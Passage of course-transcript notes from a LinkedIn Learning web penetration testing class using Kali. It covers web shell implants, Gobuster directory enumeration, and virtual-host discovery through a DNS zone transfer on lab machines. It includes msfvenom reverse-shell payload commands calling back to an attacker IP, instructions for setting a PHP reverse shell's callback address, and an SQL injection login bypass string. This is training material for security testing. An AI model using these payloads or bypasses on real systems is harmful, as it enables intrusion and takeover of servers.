> **[3:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=233)** And it provides the foundation for building out our web testing skills with some advanced techniques.

> [!info]- Semantic Content
>
> **Env Vars:** url (3), owasp (1), zap (1), sql (1)
> **Code Keywords:** let (4)
> **CLI Commands:** apache (2), cat (1)
> **Versions:** 192.168.1 (3)
> **Cross-References:** we covered (2)
> **URLs:** [http://192.168.1.176/mutillidae](http://192.168.1.176/mutillidae) (1)
> **Definitions:** is a  (1)
> **Analogies:** such as (1)

#### A refresher on website shell implants
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=0)** - [Instructor] When web testing, we will often follow an exploitation chain that starts with gaining administrative access to the web server, then allow its user shell to be gained on the target, and then we escalate privileges to gain root control.
>
> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=16)** An initial web shell will typically use one of the many forms of active scripting code.
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=22)** Consequently, we need a variety of shells on hand to include in our exploits and to use as standalone modules to deliver shells.
>
> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=30)** Because different targets will have different forms of active code, we need to have as many web shells available as possible.
>
> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=38)** We need to be able to upload our shell file into a folder which is remotely URL accessible for Linux Apache.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=46)** This is typically in /var/www/ or one of its descendant folders such as /var/www/html.
>
> **[0:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=55)** For Windows IIS, this is typically in \inetpub\wwwroot\.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=61)** Other web servers will have their own default directories.
>
> **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=65)** ColdFusion, for example, has a CFIDE folder at the webroot in which content is placed.
>
> **[1:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=73)** Kali provides a number of web shells to support the various active code options.
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=77)** Let's take a look at them.
>
> **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=79)** Ls /usr/share/webshells.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=89)** Here we can see folders for ASP, ASPX, CFM, JSP, Laudanum, PERL, and PHP.
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=96)** These all contain different variants of the same basic shell approach.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=101)** A popular form of active content is PHP.
>
> **[1:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=107)** The PHP reverse shell provides an excellent approach to gaining shell access on a target.
>
> **[1:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=112)** Let's see what it looks like.
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=114)** Before I do that, however, I'll just run a quick script to check my IP address.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=120)** Okay, my IP address at the moment is 10.0.2.18.
>
> **[2:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=125)** Sudo nano /usr/share/webshells
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=133)** /php/php-reverse-shell.php.
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=143)** Let's scroll down past the comments.
>
> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=146)** We can see the dollar IP and dollar port variables are being set.
>
> **[2:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=151)** We need to change these to the callback socket that we'll set up, our Kali system IP address and our preferred port.
>
> **[2:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=159)** I'll change these to 10.0.2.18 and 2222.
>
> **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=174)** And we'll save this as purrs.php.
>
> **[3:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=180)** Two other forms of shell we might find useful are ASP and ASPX.
>
> **[3:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=186)** ASP is an older technology but is a default part of older Microsoft IIS websites.
>
> **[3:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=193)** Let's look at the ASP shells. ASP.
>
> **[3:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=198)** Command ASP dot ASP will allow a single command to be run via the web server.
>
> **[3:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=204)** Command ASP 5.1 ASP is a variant of command ASP dot ASP, which gets around an execution prevention mechanism in our IIS 5.1.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=216)** This uses the [win.com](https://win.com) executable to force execution of the command processor.
>
> **[3:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=222)** We've got similar files in ASPX.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=227)** Command ASP dot ASPX is a popular web shell and is also known as Awin.
>
> **[3:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=232)** This is a single command reverse shell, again using a command field on the browser.
>
> **[3:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=238)** These web shells run in the browser and don't give us a reverse command shell to work in, but we can issue individual commands or we can potentially execute netcat to connect a listener and get a reverse shell.
>
> **[4:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=252)** Let's check the JSP web shells.
>
> **[4:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=257)** We can see command JSP dot JSP.
>
> **[4:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=260)** Let's have a look at what that looks like.
>
> **[4:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=263)** Sudo nano /usr/share /webshells/jsp /cmdjsp.jsp.
>
> **[4:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=280)** This shell can work either on a Linux server or a Windows server.
>
> **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=286)** As it notes at the top, the executable needs to be changed to reflect the target before deployment.
>
> **[4:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=291)** It's set here for a Windows server using CMD to process Windows commands.
>
> **[4:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=297)** Let's see what's in the Perl folder.
>
> **[5:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=303)** And let's take a look at the Perl reverse shell.
>
> **[5:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=306)** Sudo nano /usr/share/webshells /perl/perl-reverse-shell.pl.
>
> **[5:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=324)** This looks familiar.
>
> **[5:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=325)** It's a variant to the PHP script that we saw.
>
> **[5:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=332)** MSF Venom is one of the most important tools which Kali provides, and it can generate a variety of web shells.
>
> **[5:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=339)** We can create ASP payloads using the minus F switch to specify ASP format.
>
> **[5:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=346)** For example, we can create a Meterpreter ASP payload with Shikata-Ga-Nai encoding.
>
> **[5:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=354)** Msfvenom -p windows/meterpreter/ reverse_tcp LHOST=10.0.2.18 LPORT=2222 -e x86 /shikata_ga_nai
>
> **[6:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=388)** - f asp and we'll store that as met.asp.
>
> **[6:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=397)** We can similarly create GSP payloads to reverse connect back to a command shell.
>
> **[6:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=403)** Msfvenom -p java/ jsp_shell_reverse_tcp
>
> **[6:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=419)** LHOST=10.0.2.18 LPORT=2222 -f raw and we'll save that as cmd.jsp.
>
> **[7:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=435)** We can now upload these implants to web servers running the respective active code, put them into its webtree, and we can gain a command or meterpreter shell by accessing them via the url.
>
> **[7:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980&t=447)** So we have a number of existing shells and we can create our own.

> [!info]- Semantic Content
>
> **Env Vars:** asp (15), aspx (4), jsp (4), php (4), iis (3)
> **CLI Commands:** php (8), sudo (3), apache (1), ls (1), find (1)
> **Code Keywords:** let (8), var (2), switch (1)
> **Versions:** 10.0.2 (4), 5.1 (2)
> **Definitions:** is a  (4), is an  (1), known as (1)
> **Code Identifiers:** reverse_tcp (1), shikata_ga_nai (1), jsp_shell_reverse_tcp (1)
> **Analogies:** for example (2), such as (1)
> **File Paths:** php/php-reverse-shell.php (1), purrs.php (1)


### 3. Advanced Website Enumeration

> [[#Table of Contents|↑ Back to Table of Contents]]

#### Busting open a website
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=0)** - [Instructor] As with any pen testing challenge, enumeration is the key to success.
>
> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=5)** It's really important that we have visibility of what we're testing in as much detail as possible.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=11)** That means looking beyond the obvious, which differentiates pen testers from script kits.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=18)** When testing a website, it's fairly straightforward to spider through the site, going from one page and enumerating all pages it calls.
>
> **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=26)** And then all the pages they call, until we have a link tree of all pages in the website.
>
> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=31)** We can then check each page for known vulnerabilities.
>
> **[0:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=35)** However, for advanced testing we want to see what exists in the website even if it's not directly linked up to the default route.
>
> **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=44)** This is often the case when the website consists of multiple functions such as an administration or management portal, and when it has hidden test pages.
>
> **[0:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=55)** These hidden pages may get less attention or may only be partially built.
>
> **[0:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=59)** And these are often where we can find hidden paths into the system.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=63)** Let's look at what Kali provides to help us find out what's inside a website.
>
> **[1:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=69)** I'm looking at a Mytilidae website server at 192.168.1.176, and it returns just a default Apache website page.
>
> **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=79)** There's no content accessible from the main webpage and no indication of additional pages.
>
> **[1:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=86)** Kali provides a command line tool called Gobuster to do dictionary based testing to identify additional pages on a website.
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=95)** Let's run Gobuster on this site and use one of Kali's pre-loaded dictionaries.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=101)** The two basic parameters we need to provide are the URL or IP address and the word list to use for the dictionary attack.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=109)** We can also use the X switch to look for specific types of files.
>
> **[1:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=113)** We'll check for PHP files.
>
> **[1:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=116)** Gobuster dlr
>
> **[1:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=119)** - u 192.168.1.176
>
> **[2:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=127)** - x php -w, and the word list file we use as /usr/share/wordlists/dirbuster
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=143)** /directory-list-lowercase-2.3-medium.txt.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=153)** We quickly find that there's an index folder as well as folders for WordPress and Joomla.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=160)** The scan doesn't find Mytilidae as this isn't a word contained in the dictionary we are using.
>
> **[2:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=167)** It does however find a file called phpinfo.php.
>
> **[2:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=172)** Let's take a look at that.
>
> **[2:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=175)** This provides a fair bit of detail of the system configuration.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=178)** We can see it's using PHP version 7.4 on a Ubuntu 20.04 server.
>
> **[3:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=185)** We can see in the details pane, that it's using the Linux 5.15 kernel.
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=192)** Further down, we see details of the web environment.
>
> **[3:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=195)** Including configuration details for my SQL and OpenSSL.
>
> **[3:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=200)** This is very useful information for us, so that we can scope out the kind of testing we might look at conducting once we finish reconnaissance.
>
> **[3:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=209)** Given we know there's a Mytilidae folder, we can run Gobuster again, adding the Mytilidae page on the URL.
>
> **[3:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=221)** Now we see the sub folders and PHP files used in the Mytilidae website.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=227)** We'll leave Mytilidae for the moment.
>
> **[3:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=231)** Let's take a look at the Filmbox easy server on Offensive Security on IP address 192.168.60.111.
>
> **[3:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=239)** We find it also has just a default Apache page.
>
> **[4:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=243)** Let's use Gobuster to see what we can find.
>
> **[4:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=247)** Gobuster dir -you 192.168.60.111.
>
> **[4:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=255)** And we'll look for PHP files as well.
>
> **[4:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=259)** And again, we'll use /usr/share/wordlists
>
> **[4:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=268)** /drlbuster/directory-list-lowercase-2.3-medium.text.
>
> **[4:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=282)** We very quickly find a number of folders including one called Secret.
>
> **[4:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=289)** Apparently, we need to try harder.
>
> **[4:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=293)** There's another one called Admin.
>
> **[4:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=299)** The Admin page looks like we might have a way in if we can bypass authentication.
>
> **[5:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=304)** We'll enter admin for the username and quote space, or one equals one hash, for the password.
>
> **[5:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/busting-open-a-website?u=76281980&t=321)** And we're at the admin dashboard.

> [!info]- Semantic Content
>
> **CLI Commands:** find (8), php (6), apache (2)
> **Versions:** 192.168.1 (2), 2.3 (2), 192.168.60 (2), version 7 (1), 20.04 (1)
> **Env Vars:** php (4), url (2), sql (1)
> **Code Keywords:** let (5), switch (1)
> **Speakers:** - [instructor] (1), - u (1), - x (1)
> **File Paths:** directory-list-lowercase-2.3-medium.txt (1), phpinfo.php (1)
> **Tools:** command line (1)
> **Analogies:** such as (1)

#### Identifying virtual websites
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=0)** - [Instructor] When looking at a host, it's easy to assume that whatever is presented as the default website is the complete service.
>
> **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=7)** But this is often not the case.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=9)** As we've seen, the server may have many different web trees which we can access using different URL extensions to access their route pages.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=18)** We also need to be aware that Apache allows multiple name-based websites to be served from just one IP address.
>
> **[0:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=27)** Virtual hosts are accessed not by their IP address, but by their URL.
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=32)** DNS will resolve the IP address and the virtual host server will direct the incoming connection to the required virtual web server based on the URL.
>
> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=43)** The host will always have a primary virtual website which will respond to any request not specifying a name-based website.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=53)** We can see here two websites which we would connect to, not with the IP address, but with their names [example1.com](https://example1.com) and [example2.com](https://example2.com).
>
> **[1:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=64)** As a penetration tester, finding all the vhosts that run on a host is important because any one of these websites may contain vulnerabilities that allow access to the underlying server and hence, all of the web servers being run.
>
> **[1:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=80)** Unfortunately, identifying the server is a name site server and identifying the websites on it is a challenge and not something that appears immediately obvious with standard enumeration.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=93)** Here we see this.
>
> **[1:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=94)** An Apache server may also host multiple virtualized websites each with its own IP address by using different network interface cards.
>
> **[1:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=103)** From a pen testing perspective, these can be enumerated as though each runs on its own server.
>
> **[1:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=111)** Let's take a look at the Hack The Box server called Cronos.
>
> **[1:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=115)** Browsing to it, we find that it shows only the default Apache page.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=120)** To find anything useful, we need to have some additional intelligence or make some guesses.
>
> **[2:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=126)** In this case, we know that the server is named Cronos and that it's a host server in the Hack The Box domain.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=133)** Let's try using the name cronos.htb.
>
> **[2:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=137)** We need to resolve the name into its IP address.
>
> **[2:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=141)** So let's add this to our /etc/hosts file.
>
> **[2:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=145)** sudo nano /etc/hosts.
>
> **[2:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=151)** And we'll add 10.10.10.13 and call it cronos.htb.
>
> **[2:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=164)** So now let's browse to [http://cronos.htb](http://cronos.htb).
>
> **[2:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=173)** We now see that Cronus is indeed a virtual host named website.
>
> **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=178)** Once we have this validation, we can start to do quite a lot more enumeration and vulnerability scanning.
>
> **[3:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=184)** Let's find out what other websites exist on this server.
>
> **[3:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=188)** To do this, we need to use the dig tool and do a zone transfer from the server.
>
> **[3:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=193)** dig AXFR @10.10.10.13 cronos.htb.
>
> **[3:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=204)** And will use the +nostat +nocmd +nocomments.
>
> **[3:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=214)** Dig provides a list of all named hosts for the cronos.htb domain, admin.cronos.htb, ns1.cronos.htb, and www.cronos.htb.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=227)** We've already seen the www.cronos.htb, so let's now see what we can find in admin.cronos.htb.
>
> **[3:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=236)** And we'll need to add this to the /etc/hosts file as well.
>
> **[4:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=241)** 10.10.10.13. admin.cronos.htb.
>
> **[4:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=257)** Okay, this is a separate web server and we get a login for the admin site.
>
> **[4:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=262)** We won't go any further.
>
> **[4:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=264)** But enumerating for virtual hosts is a challenge.
>
> **[4:27](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/identifying-virtual-websites?u=76281980&t=267)** And at this stage, one which requires inspiration as much as analysis.

> [!info]- Semantic Content
>
